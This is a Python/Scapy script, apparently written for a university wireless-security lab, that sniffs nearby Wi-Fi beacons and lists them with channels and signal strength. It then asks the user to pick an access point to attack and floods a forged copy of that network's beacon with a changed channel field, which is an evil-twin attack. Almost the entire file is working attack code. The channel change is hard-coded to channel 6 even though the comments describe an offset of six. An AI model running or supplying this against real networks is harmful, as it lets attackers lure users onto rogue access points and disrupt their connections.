#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors  : yimnaing Kamdem && Siu Aurelien
#  Objectif : Développer un script en Python/Scapy avec les fonctionnalités suivantes :
#				- Dresser une liste des SSID disponibles à proximité
#				- Présenter à l'utilisateur la liste, avec les numéros de canaux et les puissances
#				- Permettre à l'utilisateur de choisir le réseau à attaquer
#				- Générer un beacon concurrent annonçant un réseau sur un canal différent se trouvant
#				    à 6 canaux de séparation du réseau original
#
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

from scapy.all import *
interface = "wlan0mon"
aps = {} # dictionary to store unique APs
packets = []
aps_ssid = []
channels = []
powers = []
number=0

pkt = ""

# Sniffing function 
# source for beacon frames: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around

def sniffing(packetToSniff):
    sniffing.counter = getattr(sniffing, 'counter', 0)
    if ( (packetToSniff.haslayer(Dot11Beacon))):
        # Dresser une liste des SSID disponibles à proximité       
        if packetToSniff[Dot11Elt].info not in aps_ssid :

            ssid       = packetToSniff[Dot11Elt].info
            aps_ssid.append(ssid)
            bssid      = packetToSniff[Dot11].addr3 
            channel    = int( ord(packetToSniff[Dot11Elt:3].info))
            #print('channel infos: {0}'.format(packetToSniff[Dot11Elt:3].show())) 
            #packetToSniff.show()
            packets.append(packetToSniff)
            channels.append(int( ord(packetToSniff[Dot11Elt:3].info)))
            power      = -(256 - ord(packetToSniff.notdecoded[-2:-1]))
    
            # Présenter à l'utilisateur la liste, avec les numéros de canaux et les puissances

            # Display discovered AP
            print('Number={0}, SSID= {1}, BSSID={2}, channel={3}, power={4} dBm.'\
            .format(sniffing.counter, ssid, bssid, int(channel), power ))
            sniffing.counter += 1

print('Liste des AP')
# On sniffe en passant en fonction de callback la fonction sniffing
sniff(count=300, iface=interface, prn=sniffing)


# Permettre à l'utilisateur de choisir le réseau à attaquer
if(aps_ssid) :
    number = int(input("Please choose the AP to attack (number): "))
    #Générer un beacon concurrent annonçant un réseau sur un canal différent se trouvant
    #à 6 canaux de séparation du réseau original

    testpacket = packets[number].copy()
    channel = Dot11Elt(ID='DSset', info='\x06', len=1)
    layer = testpacket.getlayer(4).payload
    layer[Dot11Elt:3] = channel
    finalpacket = RadioTap()/packets[number].getlayer(0)/packets[number].getlayer(1)/packets[number].getlayer(2)/packets[number].getlayer(3)/layer/packets[number].copy().getlayer(4)

    #frame = RadioTap()/dot11/beacon/essid/channel/rsn
    testpacket.show()
    #frame.show()
    print("\nHexdump of frame:")
    #hexdump(frame)
    #hexdump(testpacket)
    #finalpacket.show()
    input("\nPress enter to start\n")

    sendp(finalpacket, iface=interface, inter=0.100, loop=1)
else: print ('No AP detected')
  
